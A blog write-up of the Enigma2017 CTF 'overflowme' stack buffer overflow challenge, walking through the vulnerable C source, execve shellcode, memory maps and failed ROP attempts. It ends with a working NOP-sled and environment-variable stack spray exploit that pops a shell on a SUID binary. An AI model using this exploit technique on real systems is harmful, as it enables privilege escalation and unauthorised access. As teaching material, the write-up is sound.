+++
Tags = ["exploitation", "Enigma2017", "CTF", "Linux", "security", "ASLR"]
Description = "Exploitation like it's 1992"
date = "2017-02-12T17:52:54-05:00"
title = "Enigma2017 CTF Overflowme Writeup"
Categories = ["exploitation", "CTF", "Linux"]
+++

As mentioned in my last post, I spent some time solving security challenges posted on HackCenter for the Enigma2017 conference. This one (obviously) was to exploit a buffer overflow vulnerability. It was meant to be relatively easy, but sometimes you don't realize the easiest approach first. I'll walk through not just the solution, but the things I tried that *didn't* work. It was a refresher course in exploitation for me – I've spent many years on defense research and needed to brush up again. I know that this is a fast walkthrough, but I don't want to try to teach every concept here, since it is a rather basic exercise, and many others have already explained them elsewhere. If you're reading and would like clarification, feel free to hit me up on Twitter.

## The Challenge

They provided a web shell (literally a terminal emulator in your browser, at HackCenter.com) to a Linux host, and they even gave some free shellcode, `\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80`. You can disassemble this several ways, but a fast and easy way is [someone else's server running Capstone.js](https://alexaltea.github.io/capstone.js/). We observe that it is an `execve` syscall at the end, and apparently is running `/bin/sh` to provide a shell. We already *have* a shell, so there must be something different about this target process they want us to exploit.

```assembly
    31 C0   xor eax, eax                # eax = NULL
    F7 E9   imul ecx
    50      push eax                    # the NULL that terminates the string
    68 2F 2F 73 68  push 0x68732f2f     # not a pointer! The string: “h//sh”
    68 2F 62 69 6E  push 0x6e69622f     # not a pointer! The string: “h/bin”
    89 E3   mov ebx, esp
    50      push eax                    # the NULL that terminates the string
    68 2D 69 69 69  push 0x6969692d     # the string “h-iii”
    89 E6   mov esi, esp
    50      push eax                    # arguments
    56      push esi                    #	  to
    53      push ebx                    #		execve()
    89 E1   mov ecx, esp
    B0 0B   mov al, 0xb                 # the code number for execve()
    CD 80   int 0x80                    # syscall()
```

Now let's take a look at the shell we are given:

```sh
$ uname -a
Linux enigma2017 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64 GNU/Linux
$ pwd
/problems/9ae8cc98f274aa6de77715eb9bdea7ed
$ ls -la
total 24                     
drwxr-xr-x  2 root       root         4096 Jan 27 16:07 .
drwxr-x--x 89 root       root         4096 Jan 27 16:07 ..
-r--r-----  1 hacksports overflowme_0   33 Jan 31 18:57 key
-rwxr-sr-x  1 hacksports overflowme_0 6088 Jan 31 18:57 overflowme
-rw-rw-r--  1 hacksports hacksports    530 Jan 31 18:57 overflowme.c
$ id
uid=1883(myname) gid=1884(myname) groups=1884(myname),1001(competitors)
$ checksec --file overflowme
# ...weirdly, checksec never returns, a bug in HackCenter maybe...
$ cat /proc/sys/kernel/randomize_va_space
2
```

Notice the permissions for the `overlowme` binary include the [SUID access right flag](https://en.wikipedia.org/wiki/Setuid). When you run this binary, it runs as the user `hacksports`, who is the owner of `key` and can read it. The goal here is to run arbitrary code in this process and use it to read `key`. The given shellcode, executed by `overflowme`, would provide us a shell where we have the ability to read `key`.

Notice also the last command, which reads out the ASLR setting: 2. That means that we should expect the OS to randomize the layout of the program's memory when it runs (both text *and* data segments, is what 2 means).

What about the source code they're letting us see?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "inspection.h"

void vuln(char *str) {
    char buf[979];
    sprintf(buf, "Hello %s", str);
    puts(buf);
    fflush(stdout);
    return;
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv) {

    if (argc != 2) {
        printf("Usage: %s [name]\n", argv[0]);
        return 1;
    }

    be_nice_to_people();
    vuln(argv[1]);
    return 0;
}
```
## The Vulnerability

This is a stack-based buffer overflow in the sprintf() call. A fixed-length buffer, `buf[979]` takes a user input of unchecked (and unlimited) length, in the program's first command-line argument. Since `buf` is on the stack (as it is a local variable to the function `vuln`), this is a stack-based buffer overflow.

There are many, many guides out there that explain what happens when you overflow a stack-based buffer on a program that was compiled with absolutely no exploit mitigations: your input overwrites the saved return pointer (also on the stack), and the function epilogue's `RET` instruction transfers code execution to the address that is now part of the overflowed input. So, the attacker decides where execution will go: arbitrary code execution.

Proof of the vulnerability:

```sh
$ ./overflowme `perl -e 'print "\x30"x982'`
```

or if you prefer Python:

```sh
$ ./overflowme `python -c 'print "\x30"*982'`
```

## The Exploitation

Successful exploitation in a real-world scenario would require multiple prerequisite steps, but this is a simplified exploitaiton case. We just need to solve a few things.

1. Determine the offset in the attack input at which it overwrites the stored return pointer. These bytes have to point to where execution should go.
2. In order to complete step 1, determine the address where execution should go.

Let's start with the 2nd thing. Check the process memory map by launching it under GDB and using ProcFS:

```
(gdb) start
(gdb) shell ps
# ... observe the PID of overflowme, it is 32687
(gdb) shell cat /proc/32687/maps
08048000-08049000 r-xp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
08049000-0804a000 rwxp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f7570000-f7571000 rwxp 00000000 00:00 0
f7571000-f7718000 r-xp 00000000 ca:02 786437      /lib32/libc-2.19.so
f7718000-f771a000 r-xp 001a7000 ca:02 786437      /lib32/libc-2.19.so
f771a000-f771b000 rwxp 001a9000 ca:02 786437      /lib32/libc-2.19.so
f771b000-f771f000 rwxp 00000000 00:00 0
f772a000-f772b000 rwxp 00000000 00:00 0
f772b000-f772c000 r-xp 00000000 00:00 0           [vdso]
f772c000-f772e000 r--p 00000000 00:00 0           [vvar]
f772e000-f774e000 r-xp 00000000 ca:02 786434      /lib32/ld-2.19.so
f774e000-f774f000 r-xp 0001f000 ca:02 786434      /lib32/ld-2.19.so
f774f000-f7750000 rwxp 00020000 ca:02 786434      /lib32/ld-2.19.so
fff84000-fffa5000 rwxp 00000000 00:00 0           [stack]
```
The last memory range, `[stack]` is executable. You would not see this anymore these days, but this makes exploitation easier, it means shellcode in the buffer overflow input itself can run where it exists, directly. So we just need to check where the buffer is on the stack and put the address into the buffer and we're good to go?

Well hold on. Recall that we saw ASLR was enabled in the OS. Let's run it another time and see these maps again.

```
08048000-08049000 r-xp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme           
08049000-0804a000 rwxp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f75fd000-f75fe000 rwxp 00000000 00:00 0
f75fe000-f77a5000 r-xp 00000000 ca:02 786437    /lib32/libc-2.19.so
f77a5000-f77a7000 r-xp 001a7000 ca:02 786437    /lib32/libc-2.19.so    
f77a7000-f77a8000 rwxp 001a9000 ca:02 786437    /lib32/libc-2.19.so
f77a8000-f77ac000 rwxp 00000000 00:00 0
f77b7000-f77b8000 rwxp 00000000 00:00 0
f77b8000-f77b9000 r-xp 00000000 00:00 0         [vdso]
f77b9000-f77bb000 r--p 00000000 00:00 0         [vvar]
f77bb000-f77db000 r-xp 00000000 ca:02 786434    /lib32/ld-2.19.so
f77db000-f77dc000 r-xp 0001f000 ca:02 786434    /lib32/ld-2.19.so
f77dc000-f77dd000 rwxp 00020000 ca:02 786434    /lib32/ld-2.19.so
ffb9d000-ffbbe000 rwxp 00000000 00:00 0         [stack]  
```
See that the stack is at a different address. The OS has applied ASLR to the data segments and the shared libraries for `libc` and `ld`. However, the entirety of the program binary itself has not moved. That is, apparently `overflowme` was not even compiled with support for ASLR. Cool!

Our shellcode is on the stack though, and the stack is one of the parts of memory that is moving around on every run. But that's what we need a pointer to! Our only hope, then, is to find an instruction somewhere in the static mappings that jumps execution back to the stack. *Note: here is where I tried a number of unnecessary and fruitless solutions, thinking about this like a modern exploit developer (ROP gadgets, trampolines, etc.). If you just want to read the solution, skip to the next section where I "Phone a Friend."*

My goal was to find an "instruction gadget" within the static mapping that would effectively work as a `JMP ESP` or `CALL ESP`. Using `hexdump -C | grep FF` I looked for `FF E4` or `FF D4` sequences. This is an extremely crude way to do this, but keep in mind the binary is very small. Unfortunately, *because* it's so small, there was also no occurence of either byte sequence.

If any of the general-purpose registers at the time of the function return happen to also hold pointers to the stack range, then we could trampoline through a `JMP EAX/EBX/ECX/EDX` or `CALL EAX/EBX/ECX/EDX`, etc. So I also looked for any of these sequences. I found an `FF D0 (call EAX)`, and a `FF D2 (call EDX)`! Good, but do we control either of those registers? Check: `(gdb) info registers`:

```
eax            0x0      0                         
ebx            0xffa5d5a0       -5909088
ecx            0xf7726878       -143497096
edx            0x0      0
…
esp            0xffa5d56c       0xffa5d56c
ebp            0xffa5d588       0xffa5d588 
```

annnnd no, they’re both 0x0 by the time the attacker gets control of `EIP`. But what's this, `EBX` points into the stack (verified by another look at the `/proc/PID/maps`):

```
ffa3e000-ffa5f000 rwxp 00000000 00:00 0		[stack]  
```

But alas, poring over the hexdump of the static mappings in memory, there is no `CALL EBX (FF D3)` or `JMP EBX (FF E3)` gadgets! There's not even something more indirect, like a `PUSH EBX; RET (53 C3`). 

Another idea was to try to jump to one of the `GOT` entries, but this is a tiny little toy binary! It doesn't import anything useful, as we see with `objdump -T`:                                                                               

    DYNAMIC SYMBOL TABLE:                                                          
    00000000      DF *UND*  00000000  GLIBC_2.0   printf                           
    00000000      DF *UND*  00000000  GLIBC_2.0   fflush                           
    00000000      DF *UND*  00000000  GLIBC_2.0   getegid                          
    00000000      DF *UND*  00000000  GLIBC_2.0   puts                             
    00000000  w   D  *UND*  00000000              __gmon_start__                   
    00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main                
    00000000      DF *UND*  00000000  GLIBC_2.0   sprintf                          
    00000000      DF *UND*  00000000  GLIBC_2.0   setresgid                        
    08049a40 g    DO .bss   00000004  GLIBC_2.0   stdout                           
    0804872c g    DO .rodata        00000004  Base        _IO_stdin_used 
If there was a `system()` in here or something it would be a different story maybe, but as is, there are no useful standard library calls in this table.

The ROP approach to this has failed me.

## Phoning a Friend

At this point I called a smart friend of mine for a tip on how to jump the instruction pointer to this stupid shellcode on the stack. We discussed more advanced gadget-finding using Z3 solvers and all sorts of stuff, but ultimately the hints that stuck with me were:

- Duh, you can stack spray like it's 1992: just make your input 100KB, NOP-sled to the end where shellcode lies, and re-run the exploit until it works by chance (until the input happens to inhabit a range around the address we choose to put in the overflowed return pointer).
- You can store an arbitrary amount of NOP-sled in an environment variable and it will all get located in the stack segment.

## Making It Work

Okay, so I have a good idea of how to (messily and probabilistically) get a successful exploit. The only thing I skipped over earlier was determining exactly how many bytes offset into the attack input we need to place the pointer. The way you do this is to use an exploit pattern string, such as you can [generate online here](http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) or offline using [various tools](https://github.com/Svenito/exploit-pattern/blob/master/pattern.py), and then watch the value of `EIP` when the process crashes under GDB:

```sh
$ gdb --args ./overflowme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that the bytes from the pattern that fill EIP (little endian, remember) are "g8Bg".
```

I chose a pointer that was in the middlish-range for the stack: 0xff881111, converted it into little-endian order, and put it into the attack string at the same location. We can confirm:

```sh
$ gdb --args ./overflowme $(python -c 'print "A"*985 + "\x11\x11\x88\xff"')
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that EIP is 0xff881111. Maybe it doesn't point into the stack on THIS run but it sometimes will, which is all we need, since we're allowed to retry the attack until it does.
```

Putting it all together:

```sh
# Store a NOP sled of 0x90 bytes and the shellcode at the end, in the stack via an env. var.:
$ export SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"')

# Point to the stack, and keep running the attack until it works: the ol' "spray & pray"
$ for i in {1..100}; do ./overflowme $(python -c 'print "A"*985 + "\x11\x11\x88\xff"'); done

# Boom, it pops a shell:
$ ls
key  overflowme  overflowme.c                                                  
$ cat key
bb379544581fa2b010d958d6e78addfa
```